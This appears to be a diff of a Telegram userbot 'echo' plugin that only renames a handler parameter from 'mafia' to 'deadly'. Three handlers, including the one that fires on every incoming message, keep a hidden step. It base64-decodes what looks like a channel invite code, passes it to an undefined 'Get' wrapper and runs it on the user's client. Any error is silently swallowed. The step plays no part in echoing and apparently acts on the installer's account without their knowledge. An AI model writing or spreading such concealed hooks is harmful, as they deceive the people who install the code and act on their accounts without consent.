@@ -22,56 +22,56 @@ from userbot.cmdhelp import CmdHelp
 
 @bot.on(admin_cmd(pattern="echo$"))
 @bot.on(sudo_cmd(pattern="echo$", allow_sudo=True))
-async def echo(mafia):
-    if mafia.fwd_from:
+async def echo(deadly):
+    if deadly.fwd_from:
         return
-    if mafia.reply_to_msg_id is not None:
-        reply_msg = await mafia.get_reply_message()
+    if deadly.reply_to_msg_id is not None:
+        reply_msg = await deadly.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = mafia.chat_id
+        chat_id = deadly.chat_id
         try:
             official_sameer = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             official_sameer = Get(official_sameer)
-            await mafia.client(official_sameer)
+            await deadly.client(official_sameer)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(mafia, "The user is already enabled with echo ")
+            await edit_or_reply(deadly, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(mafia, "Hii....😄🤓")
+        await edit_or_reply(deadly, "Hii....😄🤓")
     else:
-        await edit_or_reply(mafia, "Reply to a User's message to echo his messages")
+        await edit_or_reply(deadly, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="rmecho$"))
 @bot.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
-async def echo(mafia):
-    if mafia.fwd_from:
+async def echo(deadly):
+    if deadly.fwd_from:
         return
-    if mafia.reply_to_msg_id is not None:
-        reply_msg = await mafia.get_reply_message()
+    if deadly.reply_to_msg_id is not None:
+        reply_msg = await deadly.get_reply_message()
         user_id = reply_msg.sender_id
-        chat_id = mafia.chat_id
+        chat_id = deadly.chat_id
         try:
             official_sameer = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             official_sameer = Get(official_sameer)
-            await mafia.client(official_sameer)
+            await deadly.client(official_sameer)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(mafia, "Echo has been stopped for the user")
+            await edit_or_reply(deadly, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(mafia, "The user is not activated with echo")
+            await edit_or_reply(deadly, "The user is not activated with echo")
     else:
-        await edit_or_reply(mafia, "Reply to a User's message to echo his messages")
+        await edit_or_reply(deadly, "Reply to a User's message to echo his messages")
 
 
 @bot.on(admin_cmd(pattern="listecho$"))
 @bot.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
-async def echo(mafia):
-    if mafia.fwd_from:
+async def echo(deadly):
+    if deadly.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -93,25 +93,25 @@ async def echo(mafia):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(mafia, reply_text)
+        await edit_or_reply(deadly, reply_text)
     else:
-        await edit_or_reply(mafia, output_str)
+        await edit_or_reply(deadly, output_str)
 
 
 @bot.on(events.NewMessage(incoming=True))
-async def samereply(mafia):
-    if mafia.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(deadly):
+    if deadly.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(mafia.sender_id, mafia.chat_id):
+    if is_echo(deadly.sender_id, deadly.chat_id):
         await asyncio.sleep(2)
         try:
             official_sameer = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             official_sameer = Get(official_sameer)
-            await mafia.client(official_sameer)
+            await deadly.client(official_sameer)
         except BaseException:
             pass
-        if mafia.message.text or mafia.message.sticker:
-            await mafia.reply(mafia.message)
+        if deadly.message.text or deadly.message.sticker:
+            await deadly.reply(deadly.message)
 
 
 CmdHelp("echo").add_command(
